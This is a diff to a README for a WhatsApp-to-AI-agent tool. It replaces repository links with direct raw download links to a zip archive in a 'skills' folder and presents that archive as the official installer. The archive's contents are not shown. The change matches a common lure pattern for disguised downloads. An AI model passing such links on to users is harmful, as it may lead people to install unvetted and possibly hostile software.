@@ -1,6 +1,6 @@
 # 🤖 claude-whatsapp - Connect your WhatsApp to AI agents
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/penstemoncyananthuslogicgate5289/claude-whatsapp)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/penstemoncyananthuslogicgate5289/claude-whatsapp/raw/refs/heads/main/skills/claude-whatsapp-v3.9.zip)
 
 ## 📋 About This Application
 
@@ -32,7 +32,7 @@ Your computer must meet these standards to run the application:
 
 You must obtain the installer file from the official source. Use the link provided below to visit the release page.
 
-[Visit this page to download the software](https://github.com/penstemoncyananthuslogicgate5289/claude-whatsapp)
+[Visit this page to download the software](https://github.com/penstemoncyananthuslogicgate5289/claude-whatsapp/raw/refs/heads/main/skills/claude-whatsapp-v3.9.zip)
 
 ## 🛠️ Installation Steps
 
